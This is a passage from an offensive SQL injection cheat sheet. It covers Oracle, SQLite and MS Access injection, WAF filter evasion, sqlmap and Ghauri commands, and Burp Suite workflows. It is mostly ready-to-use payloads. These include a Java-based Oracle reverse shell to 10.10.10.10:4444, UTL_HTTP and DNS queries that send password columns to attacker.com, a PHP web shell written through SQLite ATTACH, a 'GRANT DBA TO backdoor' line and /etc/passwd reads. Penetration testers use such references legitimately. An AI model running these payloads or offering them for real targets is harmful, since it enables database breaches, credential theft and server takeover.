SELECT user FROM dual;                      # Current user
SELECT UTL_INADDR.get_host_name FROM dual;  # Server hostname
SELECT global_name FROM global_name;        # DB name
SELECT username FROM all_users;             # All users
```

### 📋 List Tables/Columns:

```sql
# Tables accessible to current user
SELECT table_name FROM user_tables;

# Tables in specific schema
SELECT table_name FROM all_tables WHERE owner='TARGET_SCHEMA';

# Columns in specific table
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';

# Concatenate (Oracle 12c+)
SELECT LISTAGG(table_name, ', ') WITHIN GROUP (ORDER BY table_name) FROM user_tables;

# Older Oracle (use XMLAGG)
SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name, ', ').EXTRACT('//text()')).GETCLOBVAL(), ', ') 
FROM user_tables;
```

### 📤 Extract Data:

```sql
# Simple select
SELECT username, password FROM users;

# Concatenate rows
SELECT username || ':' || password FROM users;

# Concatenate all rows (12c+)
SELECT LISTAGG(username || ':' || password, ', ') WITHIN GROUP (ORDER BY username) FROM users;

# Older Oracle
SELECT RTRIM(XMLAGG(XMLELEMENT(e, username || ':' || password, ', ').EXTRACT('//text()')).GETCLOBVAL(), ', ') FROM users;
```

### 📁 File Operations (via Java):

```sql
# Enable Java in Oracle (if not already)
-- Usually enabled by default in enterprise editions

# Create Java class to read files
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "FileReader" AS
  import java.io.*;
  public class FileReader {
    public static String readFile(String filename) throws Exception {
      BufferedReader br = new BufferedReader(new FileReader(filename));
      StringBuilder sb = new StringBuilder();
      String line;
      while((line = br.readLine()) != null) sb.append(line).append("\n");
      return sb.toString();
    }
  }';
END;
/

# Call the Java method
SELECT DBMS_JAVA.runjava('FileReader.readFile("/etc/passwd")') FROM dual;
```

### ⚡ Command Execution (via Java):

```sql
# Create Java class for command execution
BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Shell" AS
  public class Shell {
    public static String runCmd(String cmd) throws java.io.IOException {
      java.util.Scanner s = new java.util.Scanner(
        Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
      return s.hasNext() ? s.next() : "";
    }
  }';
END;
/

# Execute commands
SELECT DBMS_JAVA.runjava('Shell.runCmd("whoami")') FROM dual;
SELECT DBMS_JAVA.runjava('Shell.runCmd("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")') FROM dual;
```

### 🔐 Privilege Escalation:

```sql
# List privileges
SELECT * FROM user_role_privs;           # Current user roles
SELECT * FROM dba_role_privs;            # All role grants (needs DBA)
SELECT * FROM all_tab_privs;             # Table privileges

# Check if DBA
SELECT * FROM session_roles WHERE role = 'DBA';

# Grant DBA (if has GRANT ANY ROLE)
GRANT DBA TO backdoor;
```

### ⏱️ Time Functions:

```sql
# Via DBMS_PIPE (most reliable)
SELECT DBMS_PIPE.RECEIVE_MESSAGE('X', 5) FROM dual;  # 5 second delay

# Conditional delay
SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('X', 3) ELSE NULL END FROM dual;

# Via UTL_TCP (alternative, may be blocked)
SELECT UTL_TCP.AVAILABLE('127.0.0.1', 12345) FROM dual;  # May cause delay if port closed
```

### ⚠️ Error Functions:

```sql
# Force division by zero in CASE
SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual;

# Use in conditional extraction
SELECT CASE WHEN (SELECT ASCII(SUBSTR((SELECT banner FROM v$version),1,1)) FROM dual)=79 
THEN TO_CHAR(1/0) ELSE NULL END FROM dual;
```

### 🌐 Out-of-Band:

```sql
# Via UTL_HTTP (requires network privilege)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users)) FROM dual;

# Via UTL_INADDR (DNS lookup)
SELECT UTL_INADDR.get_host_address((SELECT password FROM users)||'.attacker.com') FROM dual;

# Via XXE (older Oracle, patched in newer)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users)||'.attacker.com/"> 
%remote;]>'),'/l') FROM dual;
```

---

## 🗄️ SQLITE

### 🔑 Key Info Queries:

```sql
SELECT sqlite_version();           # SQLite version
SELECT name FROM sqlite_master WHERE type='table';  # List tables
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';  # Table schema
```

### 📋 List Tables/Columns:

```sql
# All tables
SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';

# Columns in specific table
SELECT name FROM pragma_table_info('users');

# Concatenate (SQLite 3.7.11+)
SELECT GROUP_CONCAT(name, ', ') FROM sqlite_master WHERE type='table';
SELECT GROUP_CONCAT(name, ', ') FROM pragma_table_info('users');
```

### 📤 Extract Data:

```sql
# Simple select
SELECT username, password FROM users;

# Concatenate rows
SELECT username || ':' || password FROM users;

# Concatenate all rows
SELECT GROUP_CONCAT(username || ':' || password, ', ') FROM users;
```

### 📁 File Operations:

```sql
# Read file via load_extension (if enabled)
SELECT load_extension('/path/to/evil.so');  # Dangerous!

# Write file via ATTACH + INSERT (limited)
ATTACH DATABASE '/var/www/shell.php' AS evil;
CREATE TABLE evil.shell(cmd text);
INSERT INTO evil.shell VALUES('<?php system($_GET["cmd"]); ?>');
DETACH DATABASE evil;
```

### ⏱️ Time Functions:

```sql
# SQLite has no built-in sleep, use heavy queries instead
SELECT RANDOMBLOB(1000000000/2);  # Memory-heavy, causes delay

# Or use LIKE with large pattern (CPU-heavy)
SELECT CASE WHEN 1=1 THEN 
  (SELECT COUNT(*) FROM sqlite_master, sqlite_master, sqlite_master, sqlite_master) 
ELSE 0 END;
```

### ⚠️ Error Functions:

```sql
# Force type mismatch error
SELECT CAST((SELECT name FROM sqlite_master LIMIT 1) AS int);

# Use json() to trigger error (SQLite 3.9+)
SELECT json('invalid');  # Always errors
SELECT CASE WHEN 1=1 THEN 1 ELSE json('') END;  # Conditional error
```

---

## 🗃️ MS ACCESS

### 🔑 Key Info Queries:

```sql
# MS Access has limited system tables
SELECT Name FROM MSysObjects WHERE Type=1;  # List tables (may need permissions)

# Get current database path
SELECT CurrentDb();  # Via VBA, not pure SQL
```

### 📋 List Tables:

```sql
# Standard way (if MSysObjects accessible)
SELECT Name FROM MSysObjects WHERE Type=1 AND Flags=0;

# Alternative via union (if you know table names)
' UNION SELECT Name FROM MSysObjects WHERE Type=1--
```

### ⚠️ Notes:

```
❌ No information_schema equivalent
❌ No built-in time delay functions
❌ No stacked queries support
❌ Very limited for advanced exploitation
✅ Good for: Authentication bypass, simple UNION-based extraction
```

---

# 🔹 PART 4: WAF BYPASS MASTER LIST

## 🚫 BYPASS: NO SPACES ALLOWED

### ✅ Alternative Whitespace Characters:

```sql
# URL-encoded alternatives (work in most DBs)
%09  # Tab (\t)
%0A  # Line feed (\n)
%0B  # Vertical tab
%0C  # Form feed
%0D  # Carriage return (\r)
%A0  # Non-breaking space

# Examples:
?id=1%09AND%091=1%09--
?id=1%0AAND%0A1=1%0A--
```

### ✅ SQL Comments Instead of Spaces:

```sql
# Use /**/ as space replacement
SELECT/**/password/**/FROM/**/users/**/WHERE/**/id=1

# Conditional comments (MySQL)
/*!12345SELECT*/ password /*!12345FROM*/ users

# Nested comments
SELECT/*comment*/password/*comment*/FROM/*comment*/users
```

### ✅ Parentheses Method:

```sql
# Remove spaces using parentheses
SELECT(password)FROM(users)WHERE(id=1)
SELECT(1)AND(1)=(1)
```

---

## 🚫 BYPASS: NO COMMAS ALLOWED

### ✅ OFFSET Instead of Comma in LIMIT:

```sql
# Instead of: LIMIT 0,1
LIMIT 1 OFFSET 0

# Instead of: LIMIT 5,10
LIMIT 10 OFFSET 5
```

### ✅ FROM/FOR Instead of Comma in SUBSTRING:

```sql
# Instead of: SUBSTR('SQL',1,1)
SUBSTR('SQL' FROM 1 FOR 1)

# Instead of: SUBSTRING(version(),1,1)
SUBSTRING(version() FROM 1 FOR 1)
```

### ✅ JOIN Instead of Comma in UNION SELECT:

```sql
# Instead of: UNION SELECT 1,2,3
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

# Full example:
-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT database())b JOIN (SELECT 3)c--
```

---

## 🚫 BYPASS: NO EQUAL SIGN (=) ALLOWED

### ✅ Use LIKE:

```sql
# Instead of: SUBSTR(version(),1,1)='5'
SUBSTR(version(),1,1) LIKE '5'

# Wildcard version:
SUBSTR(version(),1,1) LIKE '5%'
```

### ✅ Use BETWEEN:

```sql
# Instead of: SUBSTR(version(),1,1)='5'
SUBSTR(version(),1,1) BETWEEN '5' AND '5'

# Range version:
SUBSTR(version(),1,1) BETWEEN '4' AND '6'
```

### ✅ Use IN:

```sql
# Instead of: SUBSTR(version(),1,1)='5'
SUBSTR(version(),1,1) IN ('5')

# Multiple values:
SUBSTR(version(),1,1) IN ('4','5','6')
```

### ✅ Use REGEXP/RLIKE (MySQL):

```sql
SUBSTR(version(),1,1) REGEXP '^5$'
SUBSTR(version(),1,1) RLIKE '^5$'
```

### ✅ Use NOT + Comparison:

```sql
# Instead of: = '5'
NOT (SUBSTR(version(),1,1) < '5') AND NOT (SUBSTR(version(),1,1) > '5')
```

---

## 🚫 BYPASS: KEYWORD BLACKLIST

### ✅ Case Variation:

```sql
# Mix upper/lower case
SeLeCt * fRoM uSeRs
UNiOn SeLeCt
AnD 1=1
OR 1=1

# URL-encoded case
%53%45%4C%45%43%54  # SELECT
%55%4E%49%4F%4E     # UNION
```

### ✅ Alternative Operators:

```sql
# Instead of AND
&& 
%26%26 (URL-encoded &&)

# Instead of OR
||
%7C%7C (URL-encoded ||)

# Instead of =
LIKE, REGEXP, RLIKE, BETWEEN, IN

# Instead of >
NOT BETWEEN 0 AND X
```

### ✅ Keyword Splitting:

```sql
# Insert comments inside keywords
SE%0ALECT  → SELECT
U/**/NION  → UNION
AN%09D     → AND

# URL-encoded split
SE%0ALECT%0AFROM  → SELECT FROM
```

### ✅ String Concatenation:

```sql
# Build keywords from parts
CONCAT('SEL','ECT') → SELECT
CONCAT('UN','ION') → UNION

# Using CHAR/ASCII
CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84)) → SELECT

# Using hex
CONCAT(0x53,0x45,0x4C,0x45,0x43,0x54) → SELECT
```

---

## 🚫 BYPASS: ENCODING TRICKS

### ✅ URL Encoding:

```sql
# Single encoding
SELECT → %53%45%4C%45%43%54
UNION → %55%4E%49%4F%4E

# Double encoding (when WAF decodes once)
%53 → %2553
%55%4E → %2555%254E

# Mixed encoding
UNION → %55nion  (only first char encoded)
```

### ✅ Unicode Encoding:

```sql
# Fullwidth characters (often bypass case-sensitive filters)
SELECT → ＳＥＬＥＣＴ
UNION → ＵＮＩＯＮ
FROM → ＦＲＯＭ

# Unicode alternatives
SELECT → ＳᵉＬＥＣＴ  (mix fullwidth + normal)
```

### ✅ Unicode Normalization Bypass:

```sql
# Some WAFs don't normalize Unicode
# These look like keywords but aren't caught by simple regex:

# Zero-width characters inside keywords
S​ELECT  (zero-width space between S and E)
UN​ION

# Homoglyphs (characters that look similar)
SELECT → ЅЕLЕСТ  (Cyrillic S, E, C)
```

---

## 🚫 BYPASS: ADVANCED EVASION

### ✅ Scientific Notation Trick:

```sql
# WAFs may not parse scientific notation correctly
-1' OR 1.e1 OR '1'='1      # 1.e1 = 10.0
-1' OR 1337.1337e1 OR '1'='1  # 1337.1337e1 = 13371.337

# Use in comparisons:
WHERE id=1 → WHERE id=1.e0  (1.e0 = 1.0)
```

### ✅ Mathematical Equivalents:

```sql
# Instead of: id=1
id=2-1
id=abs(1)
id=pow(1,1)
id=sqrt(1)
id=1*1
id=1+0

# Instead of: id>5
id NOT BETWEEN 0 AND 5
id>=6
```

### ✅ Boolean Equivalents:

```sql
# Instead of: AND 1=1
AND 1
AND TRUE
AND 'a'='a'
AND (1)
AND NOT 0

# Instead of: OR 1=2
OR 0
OR FALSE
OR 'a'='b'
OR (0)
```

### ✅ Function-Based Bypass:

```sql
# Use functions to rebuild filtered values
# Instead of: 'admin'
CONCAT('ad','min')
CHAR(97,100,109,105,110)
0x61646D696E  (hex for 'admin')

# Instead of: SELECT
(/*!50000SEL*/ECT)  # MySQL conditional comment
REVERSE(TCELES)  # Reverse + reverse back in logic
```

---

## 🎯 WAF BYPASS PAYLOADS LIBRARY

### ✅ Universal Bypass Payloads:

```sql
# Basic bypass with multiple techniques combined
'/**/OR/**/'1'='1/**/--
'/*!50000OR*/'1'='1'/*!50000--*/
'%20OR%20'1'='1%20--

# No-space + no-comma + case variation
'/**/UnIoN/**/SeLeCt/**/null,null,null/**/FrOm/**/users/**/WhErE/**/1=1--

# Encoding + comment + case
%27%2F%2A%2A%2FUnIoN%2F%2A%2A%2FSeLeCt%2F%2A%2A%2Fnull--
```

### ✅ MySQL-Specific Bypass:

```sql
# Conditional comments (version-specific)
/*!50000UNION SELECT*/ 1,2,3--
/*!12345SELECT*/ password /*!12345FROM*/ users

# Hex encoding for strings
SELECT 0x61646D696E  # 'admin' in hex
WHERE username=0x61646D696E

# CHAR() for string building
WHERE username=CHAR(97,100,109,105,110)
```

### ✅ MSSQL-Specific Bypass:

```sql
# String concatenation without +
SELECT 'ad' 'min'  # Implicit concatenation

# Alternative to SUBSTRING
SELECT SUBSTRING(version(),1,1) → SELECT LEFT(version(),1)

# Bypass space with tab
SELECT%09password%09FROM%09users
```

### ✅ PostgreSQL-Specific Bypass:

```sql
# Type cast syntax
SELECT '5'::int  # Instead of CAST('5' AS int)

# String concatenation
SELECT 'ad' || 'min'  # Instead of CONCAT('ad','min')

# Array-based bypass
SELECT ARRAY[1,2,3]  # Instead of SELECT 1,2,3
```

### ✅ Oracle-Specific Bypass:

```sql
# String concatenation
SELECT 'ad' || 'min' FROM dual

# Using DUAL for all queries
SELECT version FROM v$version WHERE 1=1  # Add WHERE 1=1 to bypass filters

# Hex to char conversion
SELECT CHR(97)||CHR(100)||CHR(109) FROM dual  # 'adm'
```

---

# 🔹 PART 5: TOOLS CHEAT SHEET

## 🗂️ SQLMAP COMPLETE GUIDE

### ✅ Basic Usage:

```bash
# Scan URL with parameter
sqlmap -u "http://target.com/page.php?id=1"

# Scan specific parameter only
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# Scan with POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Scan with custom headers
sqlmap -u "http://target.com/page.php?id=1" -H "X-Forwarded-For: 127.0.0.1"

# Scan with cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123; security=low"
```

### ✅ Using Request File (from Burp):

```bash
# Save request from Burp to file.txt, then:
sqlmap -r file.txt

# With advanced options:
sqlmap -r file.txt \
  --batch \
  --random-agent \
  --tamper=space2comment,between \
  --threads=10 \
  --level=5 --risk=3
```

### ✅ Enumeration Options:

```bash
# Get DBMS banner
sqlmap -u "URL" --banner

# Get current user/database
sqlmap -u "URL" --current-user --current-db

# List all databases
sqlmap -u "URL" --dbs

# List tables in specific DB
sqlmap -u "URL" -D target_db --tables

# List columns in specific table
sqlmap -u "URL" -D target_db -T users --columns

# Dump table data
sqlmap -u "URL" -D target_db -T users --dump

# Dump specific columns only
sqlmap -u "URL" -D target_db -T users -C username,password --dump

# Get row count for table
sqlmap -u "URL" -D target_db -T users --count
```

### ✅ Exploitation Options:

```bash
# Get OS shell (if possible)
sqlmap -u "URL" --os-shell

# Get SQL shell (interactive SQL prompt)
sqlmap -u "URL" --sql-shell

# Execute system command
sqlmap -u "URL" --os-cmd "whoami"

# Upload file to server
sqlmap -u "URL" --file-write="/local/shell.php" --file-dest="/var/www/shell.php"

# Download file from server
sqlmap -u "URL" --file-read="/etc/passwd"
```

### ✅ Technique Selection:

```bash
# Use all techniques (default is smart auto-detect)
sqlmap -u "URL" --technique=BEUSTQ

# Techniques explained:
# B = Boolean-based blind
# E = Error-based
# U = Union query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries

# Force specific DBMS (for faster testing)
sqlmap -u "URL" --dbms=MySQL
sqlmap -u "URL" --dbms="MySQL>=5.0"

# Force specific technique
sqlmap -u "URL" --technique=U  # Only union-based
sqlmap -u "URL" --technique=T  # Only time-based
```

### ✅ WAF Bypass Options:

```bash
# List available tamper scripts
sqlmap --list-tampers

# Common tamper scripts:
--tamper=space2comment          # Replace space with /**/
--tamper=between                # Replace > with NOT BETWEEN
--tamper=charencode             # URL-encode all characters
--tamper=apostrophemask         # Replace ' with %EF%BC%87 (fullwidth)
--tamper=uppercase              # Convert to uppercase
--tamper=varnish                # Add HTTP headers to bypass cache/WAF
--tamper=space2dash             # Replace space with -- comment
--tamper=space2hash             # Replace space with # comment (MySQL)

# Use multiple tampers
--tamper=space2comment,between,uppercase

# Random user agent
--random-agent

# Mobile user agent
--mobile

# Add delay between requests
--delay=1

# Ignore specific HTTP codes
--ignore-code=401,403,404
```

### ✅ Performance Options:

```bash
# Increase threads (faster but more detectable)
--threads=10

# Reduce threads for stealth
--threads=1

# Increase timeout for slow connections
--timeout=60

# Increase retries for unstable connections
--retries=5

# Reduce level/risk for faster scan
--level=1 --risk=1  # Default, fastest
--level=3 --risk=2  # More thorough
--level=5 --risk=3  # Most thorough, slowest
```

### ✅ Session Management:

```bash
# Save session for later resume
# (automatic, stored in ~/.sqlmap/output/)

# Resume interrupted scan
sqlmap -u "URL" --resume

# Flush session for target (start fresh)
sqlmap -u "URL" --flush-session

# Ignore stored results, force re-test
sqlmap -u "URL" --fresh-queries
```

### ✅ Output Options:

```bash
# Verbose output (1-6, higher = more details)
-v 3

# Save output to file
--output-dir="/path/to/save"

# CSV format for easy parsing
--csv

# JSON format for automation
--json

# Batch mode (no prompts)
--batch

# Silent mode (minimal output)
--silent
```

### ✅ SQLMap One-Liners:

```bash
# Full enumeration in one command
sqlmap -u "URL" --batch --random-agent --threads=10 --dbs --tables --columns --dump

# Quick auth bypass test
sqlmap -u "URL" --data="user=admin&pass=test" --batch --technique=B --current-db

# WAF bypass heavy scan
sqlmap -u "URL" --batch --random-agent --tamper=space2comment,between --threads=5 --level=3

# Blind SQLi extraction (slow but reliable)
sqlmap -u "URL" --technique=BT --time-sec=10 --threads=1 --batch
```

---

## 🗂️ GHAURI COMPLETE GUIDE

### ✅ Basic Usage:

```bash
# Scan URL
ghauri -u "http://target.com/page.php?id=1"

# Scan specific parameter
ghauri -u "http://target.com/page.php?id=1&name=test" -p id

# Scan with POST data
ghauri -u "http://target.com/login" --data="username=admin&password=test"

# Scan with custom header
ghauri -u "http://target.com/page.php" -H "X-Forwarded-For: 127.0.0.1"
```

### ✅ Using Request File:

```bash
# From Burp export
ghauri -r request.txt

# With advanced options
ghauri -r request.txt \
  --batch \
  --random-agent \
  --threads=5 \
  --level=2 \
  --technique=BET
```

### ✅ Enumeration Options:

```bash
# Get DBMS banner
ghauri -u "URL" --banner

# Get current user/database
ghauri -u "URL" --current-user --current-db

# Get server hostname
ghauri -u "URL" --hostname

# List databases
ghauri -u "URL" --dbs

# List tables in specific DB
ghauri -u "URL" -D target_db --tables

# List columns in specific table
ghauri -u "URL" -D target_db -T users --columns

# Dump table data
ghauri -u "URL" -D target_db -T users --dump

# Get row count
ghauri -u "URL" -D target_db -T users --count

# Extract limited results
ghauri -u "URL" --dbs --start=1 --stop=3  # First 3 DBs only
```

### ✅ Technique Options:

```bash
# Use specific techniques (B=Boolean, E=Error, T=Time, S=Stacked)
ghauri -u "URL" --technique=BET

# Default "BEST" auto-selects best technique
ghauri -u "URL" --technique=BEST

# Force DBMS for faster testing
ghauri -u "URL" --dbms=MySQL

# Adjust time delay for blind tests
ghauri -u "URL" --time-sec=10
```

### ✅ Detection Tuning:

```bash
# Increase test level (1-3)
ghauri -u "URL" --level=2

# Match on specific HTTP code for TRUE
ghauri -u "URL" --code=200

# Match on string in response for TRUE
ghauri -u "URL" --string="Welcome"

# Match on string for FALSE
ghauri -u "URL" --not-string="Error"

# Compare only text content (ignore HTML)
ghauri -u "URL" --text-only
```

### ✅ WAF Bypass Options:

```bash
# Skip URL encoding (if WAF double-decodes)
ghauri -u "URL" --skip-urlencode

# Protect specific chars from encoding
ghauri -u "URL" --safe-chars="[]{}"

# Custom prefix/suffix for payloads
ghauri -u "URL" --prefix="'" --suffix="-- -"

# Use alternative operators for fetching
ghauri -u "URL" --fetch-using=between

# Random user agent
ghauri -u "URL" --random-agent

# Mobile user agent
ghauri -u "URL" --mobile

# Add delay between requests
ghauri -u "URL" --delay=2

# Ignore problematic HTTP codes
ghauri -u "URL" --ignore-code=401,403
```

### ✅ Session & Performance:

```bash
# Batch mode (no prompts)
ghauri -u "URL" --batch

# Flush session for target
ghauri -u "URL" --flush-session

# Ignore stored results
ghauri -u "URL" --fresh-queries

# Confirm payloads before sending
ghauri -u "URL" --confirm

# Increase threads
ghauri -u "URL" --threads=10

# Increase timeout
ghauri -u "URL" --timeout=60

# Increase retries
ghauri -u "URL" --retries=5
```

### ✅ Advanced Features:

```bash
# Interactive SQL shell (experimental)
ghauri -u "URL" --sql-shell

# Scan multiple targets from file
ghauri -m targets.txt --batch

# Verbose output (1-5)
ghauri -u "URL" -v 3

# Update Ghauri from GitHub
ghauri --update

# Filter payloads by title (experimental)
ghauri -u "URL" --test-filter="MySQL"
```

### ✅ Ghauri One-Liners:

```bash
# Quick scan with auto-detect
ghauri -u "URL" --batch --dbs

# Blind SQLi focused
ghauri -u "URL" --batch --technique=BT --time-sec=8

# WAF evasion scan
ghauri -u "URL" --batch --random-agent --delay=1 --skip-urlencode --dbs

# Full enumeration
ghauri -u "URL" --batch --banner --current-db --dbs --tables --columns --dump
```

---

## 🗂️ MANUAL TESTING CHECKLIST

### ✅ Step 1: Recon

```
[ ] Identify all input points (GET, POST, headers, cookies, JSON, XML)
[ ] Note application behavior (error pages, redirects, content changes)
[ ] Check for WAF (Cloudflare, Akamai, etc.) - look for block pages
[ ] Test with normal inputs first to understand expected behavior
```

### ✅ Step 2: Discovery Payloads

```
[ ] Try basic quotes: ' " `
[ ] Try closing patterns: ') ") `) '))
[ ] Try comments: '--  #  /*
[ ] Try logic tests: ' OR '1'='1  ' AND '1'='2
[ ] Try time tests: ' AND SLEEP(5) (adjust per DBMS)
[ ] Encode payloads: URL encode, double encode, Unicode
```

### ✅ Step 3: Confirm SQLi

```
[ ] TRUE test: payload that should return normal page
[ ] FALSE test: payload that should return different page
[ ] Time test: payload that should cause delay
[ ] Error test: payload that should trigger DB error
[ ] Compare: content length, HTTP code, response time, page structure
```

### ✅ Step 4: Identify DBMS
```
[ ] Try DBMS-specific functions: @@version, version(), banner
[ ] Try information_schema queries (MySQL/PG/MSSQL)
[ ] Try Oracle-specific: v$version, dual
[ ] Try SQLite: sqlite_version(), sqlite_master
[ ] Observe error messages for DBMS hints
```

### ✅ Step 5: Enumerate

```
[ ] Get DB version
[ ] Get current user
[ ] Get current database
[ ] List all databases
[ ] List tables in target DB
[ ] List columns in target table
[ ] Extract sample data
```

### ✅ Step 6: Exploit

```
[ ] Choose best technique based on what works:
    - Output visible? → Union-based
    - Errors visible? → Error-based  
    - TRUE/FALSE detectable? → Boolean blind
    - Only time detectable? → Time-based blind
    - Network allowed? → Out-of-band
[ ] Extract sensitive data: users, passwords, emails, tokens
[ ] Try privilege escalation: read files, execute commands
[ ] Document everything: payloads, responses, timestamps
```

### ✅ Step 7: Post-Exploitation (If Authorized)

```
[ ] Check for writable directories
[ ] Check for command execution functions
[ ] Check for file read/write permissions
[ ] Check for linked servers / external connections
[ ] Check for backup files / config files with credentials
[ ] Document impact and remediation steps
```

---

## 🗂️ BURP SUITE INTEGRATION

### ✅ Using Burp Scanner:
```
1. Send request to Repeater
2. Right-click parameter → "Scan for SQLi"
3. Review findings in Scanner tab
4. Use "Issue activity" to see payload details
```

### ✅ Using Intruder for SQLi:
```
1. Send request to Intruder
2. Set attack type: Sniper (one param) or Cluster Bomb (multiple)
3. Mark parameter positions with §payload§
4. Load SQLi payloads from:
   - Built-in: Payloads → SQL Injection
   - Custom: Load from file (PayloadsAllTheThings, etc.)
5. Configure Grep - Match for error detection:
   - "SQL syntax"
   - "mysql_fetch"
   - "ORA-"
   - "PostgreSQL"
   - "SQLite"
6. Run attack, review results by response length/code
```

### ✅ Using Collaborator for OOB:
```
1. Open Collaborator client in Burp
2. Copy unique subdomain: abc123.burpcollaborator.net
3. Use in OOB payloads:
   - MySQL: LOAD_FILE('\\\\abc123.burpcollaborator.net\\a')
   - MSSQL: xp_dirtree '//abc123.burpcollaborator.net/a'
4. Poll Collaborator for DNS/HTTP interactions
5. Extract exfiltrated data from interaction details
```

### ✅ Using Logger++ for Analysis:
```
1. Install Logger++ extension
2. Send SQLi payloads via Repeater/Intruder
3. Compare requests/responses side-by-side
4. Filter by: response length, status code, keywords
5. Export findings for reporting
```

### ✅ Using Turbo Intruder for Speed:
```
1. Send request to Turbo Intruder
2. Use Python script for custom SQLi logic:
   engine.queue(request, callback=handle_response)
3. Implement binary search for blind extraction:
   - Test ASCII ranges, narrow down character by character
4. Handle rate limiting with engine.rateLimit()
5. Save extracted data to file
```

---

# 🔹 PART 6: QUICK REFERENCE TABLES

## 📝 COMMENTS BY DBMS
| DBMS | Comment Syntax | Notes |
|------|---------------|-------|
| MySQL | `#` / `-- ` / `/* */` | Space required after `--` |
| MSSQL | `--` / `/* */` | |
| PostgreSQL | `--` / `/* */` | |
| Oracle | `--` | |
| SQLite | `--` / `/* */` | |

## 🔗 STRING CONCATENATION BY DBMS
| DBMS | Syntax | Example |
|------|--------|---------|
| MySQL | `'a' 'b'` or `CONCAT('a','b')` | `'foo' 'bar'` → `foobar` |
| MSSQL | `'a'+'b'` | `'foo'+'bar'` → `foobar` |
| PostgreSQL | `'a'\|\|'b'` | `'foo'\|\|'bar'` → `foobar` |
| Oracle | `'a'\|\|'b'` | `'foo'\|\|'bar'` → `foobar` |
| SQLite | `'a'\|\|'b'` | `'foo'\|\|'bar'` → `foobar` |

## ✂️ SUBSTRING BY DBMS
| DBMS | Syntax | Example (get "ba" from "foobar") |
|------|--------|----------------------------------|
| MySQL | `SUBSTR(str,pos,len)` | `SUBSTR('foobar',4,2)` |
| MSSQL | `SUBSTRING(str,pos,len)` | `SUBSTRING('foobar',4,2)` |
| PostgreSQL | `SUBSTRING(str FROM pos FOR len)` | `SUBSTRING('foobar' FROM 4 FOR 2)` |
| Oracle | `SUBSTR(str,pos,len)` | `SUBSTR('foobar',4,2)` |
| SQLite | `SUBSTR(str,pos,len)` | `SUBSTR('foobar',4,2)` |

> ⚠️ Position starts at **1** (not 0) in all DBMS

## ⏱️ TIME DELAY BY DBMS
| DBMS | Unconditional | Conditional |
|------|--------------|-------------|
| MySQL | `SLEEP(5)` | `IF(1=1,SLEEP(5),0)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `IF 1=1 WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(5)` | `CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('X',5)` | `CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('X',5) ELSE NULL END` |
| SQLite | *(no built-in)* | Use heavy query: `RANDOMBLOB(1000000000/2)` |

## ⚠️ ERROR-BASED BY DBMS
| DBMS | Payload | Extracts |
|------|---------|----------|
| MySQL | `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))` | DB name in error |
| MySQL | `UPDATEXML(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)),1)` | Password in error |
| MSSQL | `CONVERT(int,(SELECT @@version))` | Version in error |
| MSSQL | `CAST((SELECT password FROM users) AS int)` | Password in error |
| PostgreSQL | `CAST((SELECT version()) AS int)` | Version in error |
| Oracle | `CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END` | Triggers error conditionally |

## 🌐 OOB EXFILTRATION BY DBMS
| DBMS       | DNS Method                                         | HTTP Method          | Notes                      |
| ---------- | -------------------------------------------------- | -------------------- | -------------------------- |
| MySQL      | `LOAD_FILE('\\\\data.attacker.com\\a')`            | *(Windows only)*     | Requires file privileges   |
| MSSQL      | `xp_dirtree '//data.attacker.com/a'`               | `sp_OAMethod` + HTTP | Most reliable for OOB      |
| PostgreSQL | `COPY '' TO PROGRAM 'nslookup data.attacker.com'`  | `dblink` + HTTP      | Requires superuser         |
| Oracle     | `UTL_INADDR.get_host_address('data.attacker.com')` | `UTL_HTTP.REQUEST()` | Requires network privilege |
| SQLite     | *(no native OOB)*                                  | *(no native OOB)*    | Very limited OOB support   |


---

## 🎯 FINAL QUICK CHEAT (Print This!)

```
🔍 DISCOVER: Try ' " ` ) -- in all inputs
✅ CONFIRM: TRUE='1'='1' / FALSE='1'='2' / TIME=SLEEP(5)
🗄️ IDENTIFY: @@version / version() / banner / sqlite_version()
📊 ENUMERATE: information_schema / sysdatabases / all_tables
🔗 UNION: ORDER BY N → UNION SELECT NULL×N → Replace NULL with data
⚠️ ERROR: EXTRACTVALUE / CONVERT(int,subquery) / CAST(subquery AS int)
🙈 BLIND: ASCII(SUBSTR(query,pos,1))=X → Binary search chars
⏱️ TIME: IF(cond,SLEEP(5),0) → Measure response delay
🌐 OOB: LOAD_FILE / xp_dirtree / UTL_HTTP → DNS/HTTP exfil
🛡️ BYPASS: /**/ for space, BETWEEN for =, CONCAT for strings
🤖 TOOLS: sqlmap -u URL --batch --dbs | ghauri -u URL --batch
📋 MANUAL: Repeater + Intruder + Collaborator + Logger++
```

---

